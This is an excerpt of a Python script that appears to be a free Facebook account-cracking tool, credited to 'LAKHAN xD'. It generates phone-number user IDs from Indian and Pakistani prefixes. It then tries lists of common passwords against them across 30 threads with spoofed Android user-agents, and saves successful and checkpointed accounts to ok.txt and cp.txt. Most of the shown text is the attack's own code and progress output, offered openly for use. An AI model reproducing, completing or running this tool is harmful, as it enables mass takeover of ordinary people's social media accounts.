...
os.system("clear")
print(" ENJOY KRO FREE HAI ENTER SBAYOO")
os.system("xdg-open https://www.facebook.com/profile.php?id=100072745961747_?si=8lJ9ghy7OtPlMXet")
#app  check 
...
\033[1;34m| $$            | $$  | $$      | $$\  $$       | $$  | $$      | $$  | $$      | $$\  $$$
\033[1;32m| $$$$$$$$      | $$  | $$      | $$ \  $$      | $$  | $$      | $$  | $$      | $$ \  $$
 \033[1;37|________/      |__/  |__/      |__/  \__/      |__/  |__/      |__/  |__/      |__/  \__/
                                                                                                                                                                                                                                                                         

\033[1;31m(•)=============================================🥀
\033[1;36m[•] \033[1;34mCREATED BY   : » \033[1;34m LAKHAN xD
\033[1;32m[•] \033[1;36mFACEBOK      : » \033[1;36m LAKHAN xD
\033[1;37m[•] \033[1;37mGITHUB       : » \033[1;37mLAKHAN143
\033[1;33m[•] \033[1;34mSTATUS       : » \033[1;34m FREE RANDOM
\033[1;35m[•] \033[1;36mBROTHER      : » \033[1;36m ANOX-SAGA-LAKHAN
\033[1;32m[•] \033[1;33mVERSION      : » \033[1;33m2.0
\033[1;31m(•)🌎==================9N0x=========================🌏\n\n"""  
loop = 0
oks = []
cps = []
...
def random_number():
	...
	os.system('clear')
	print(logo)
	print("\033[1;32m INDIA code : 9353,8371,6383,8795,6325")
	print(47*'-')
	kode = input('[?] Choice sim : ')
	print(47*'-')
	os.system('clear')
	print(logo)
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POT-AL00a Build/HUAWEIPOT-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/273.0.0.39.123;]',}
		...
		sys.stdout.write('\r\33[1;37m[LAKHAN FIRE] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
...
def random_pak_number():
	...
	os.system('clear')
	print(logo)
	print('[+] PK code  : 92303,92306,92307,92305,92317')
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'57273200','59039200','57575751','baloch','pakistan','khan12345','alikhan12345','aliali','janjan','ali1122','khann1122','khan12','khan123','khan786']
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',}
		...
		sys.stdout.write('\r\33[1;37m[LAKHAN-🥰] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
